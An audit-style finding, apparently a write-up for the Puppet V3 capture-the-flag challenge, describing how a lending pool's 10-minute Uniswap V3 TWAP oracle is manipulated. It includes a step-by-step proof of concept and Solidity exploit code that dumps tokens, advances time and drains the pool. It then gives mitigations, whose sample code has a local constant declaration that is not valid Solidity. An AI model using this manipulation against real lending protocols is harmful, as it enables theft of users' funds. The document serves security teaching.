### [H-1] Lending pool uses manipulable Uniswap V3 TWAP oracle allowing undercollateralized borrowing via time-weighted price crash

**Description:** `PuppetV3Pool._getOracleQuote()` derives the token price from
a Uniswap V3 TWAP over a 10-minute window via `OracleLibrary.consult()`. While
TWAPs resist single-block spot price manipulation, they remain vulnerable to
sustained price manipulation combined with time advancement. An attacker with
sufficient token balance can dump tokens into the pool to crash the spot price,
then wait a fraction of the TWAP window — enough for the weighted average to
reflect a dramatically lower price — before borrowing against the manipulated
oracle.

**Impact:** An attacker can borrow the lending pool's entire token balance
(1,000,000 DVT) for a fraction of its true WETH value by crashing the Uniswap
V3 spot price and waiting just 113 seconds — well within the 115-second
challenge constraint — before the TWAP reflects a low enough price to make
the required deposit affordable.

**Proof of Concept:**

1. Wrap player's 1 ETH into WETH.
2. Swap entire player token balance (110 DVT) into the Uniswap V3 pool via
   `exactInputSingle()` — crashes spot price from 1:1 to near zero.
3. Advance time by 113 seconds via `skip(113)` — 113/600 = ~19% of the TWAP
   window now reflects the crashed price.
4. Call `calculateDepositOfWETHRequired(1_000_000e18)` — TWAP-derived deposit
   requirement drops from ~3M WETH to well under 1 WETH.
5. Approve and call `borrow(1_000_000e18)` — entire pool drained for negligible
   collateral.
6. Transfer all borrowed tokens to recovery account.

<details>
<summary>Example Code Snippet</summary>

```solidity
ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

// Wrap ETH
weth.deposit{value: player.balance}();

// Dump all tokens — crash the price
token.approve(address(swapRouter), type(uint256).max);
swapRouter.exactInputSingle(ISwapRouter.ExactInputSingleParams({
    tokenIn: address(token),
    tokenOut: address(weth),
    fee: FEE,
    recipient: player,
    deadline: block.timestamp,
    amountIn: token.balanceOf(player),
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
}));

skip(113);

uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(
    LENDING_POOL_INITIAL_TOKEN_BALANCE
);
weth.approve(address(lendingPool), depositRequired);
lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
```

</details>

**Recommended Mitigation:**

1. Increase the TWAP window significantly — a 10-minute window with concentrated
   liquidity pools is insufficient. Use at least 30-60 minutes to raise the cost
   of sustained manipulation.
2. Add a circuit breaker — reject borrows if the current spot price deviates
   more than a threshold (e.g. 10%) from the TWAP, since large deviations signal
   active manipulation.
3. Use a secondary price source — combine the TWAP with a Chainlink price feed
   and take the more conservative (higher collateral) of the two values.

<details>
<summary>Mitigation Code</summary>

```solidity
// Fix 1: longer TWAP window
uint32 public constant TWAP_PERIOD = 30 minutes; // was 10 minutes

// Fix 2: circuit breaker — reject if spot deviates too far from TWAP
function _getOracleQuote(uint128 amount) private view returns (uint256) {
    (int24 arithmeticMeanTick,) = OracleLibrary.consult({
        pool: address(uniswapV3Pool), 
        secondsAgo: TWAP_PERIOD
    });

    // Also get current spot tick
    (,int24 spotTick,,,,,) = uniswapV3Pool.slot0();

    // Choose based on your risk tolerance
    int24 constant MAX_TICK_DEVIATION = 500; // ~5%

    int24 deviation = arithmeticMeanTick - spotTick;
    require(
        deviation > -MAX_TICK_DEVIATION && deviation < MAX_TICK_DEVIATION,
        "Price manipulation detected"
    );

    return OracleLibrary.getQuoteAtTick({
        tick: arithmeticMeanTick,
        baseAmount: amount,
        baseToken: address(token),
        quoteToken: address(weth)
    });
}
```

</details>
